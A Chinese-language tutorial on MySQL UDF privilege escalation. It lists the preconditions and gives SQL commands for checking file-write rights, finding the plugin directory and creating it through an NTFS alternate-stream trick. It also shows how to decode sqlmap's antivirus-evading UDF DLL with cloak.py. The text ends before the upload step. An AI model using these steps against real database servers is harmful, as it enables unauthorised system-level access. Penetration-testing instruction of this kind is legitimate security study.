                                                      # Mysql UDF提权

                                                      • UDF（User Defined Function）用户自定义函数：使用过MySQL的人都知道，MySQL有很多内置函数提供给使用者，包括字符串函数、数值函数、日期和时间函数等，给开发人员和使用者带来了很多方便。MySQL的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，幸运的是，MySQL给使用者提供了添加新函数的机制，这种使用者自行添加的MySQL函数就称为UDF(User Define Function)。

                                                      • 提权条件

                                                        1. 知道mysql的用户名和密码，且开启了远程连接mysql的功能。
                                                        2. mysql具有写入文件的权限，即secure_file_priv的值为' '(空)。

                                                      • 提权效果：跟运行mysql用户有关，如果是管理员用户运行则提到的权限也是管理员。

                                                      # 提权步骤

                                                      1. 检查是否具有写入文件权限
                                                      show global variables like '%secure%' 

如果搭建的环境不具备写入权限，则去mysql.ini配置文件加入：secure_file_priv=''
                                                      • secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。
                                                        • secure_file_priv的值为null ，表示不允许导出导入文件。 secure_file_priv的值为/tmp/ ，表示仅允许在/tmp/目录下进行文件的导出导入。 secure_file_priv的为空时，表示mysql具有任意目录的导出导入文件权限。
                                                      1. 上传UDF的动态链接库文件
                                                      • 如果mysql>5.1：udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）
                                                      • 如果mysql<5.1：
                                                        • 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。
                                                        • 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。

1.获取mysql的安装路径。
select @@basedir;

2.获取mysql版本信息。
select version(),@@version_compile_os;

3.尝试创建plugin文件夹
select 'xxx' into dumpfile 'C:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION';

4.查找plugin文件夹
show variables like '%plugin%';

5.准备udf.dll文件，根据服务器系统的位数准备dll。
sqlmap中内置了，目录为：sqlmap安装目录\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_

6.由于sqlmap中的dll文件经过编码和免杀处理，不能直接使用，需要自己解码。
sqlmap有自带的解码脚本：sqlmap安装目录\extra\cloak\cloak.py
python cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll
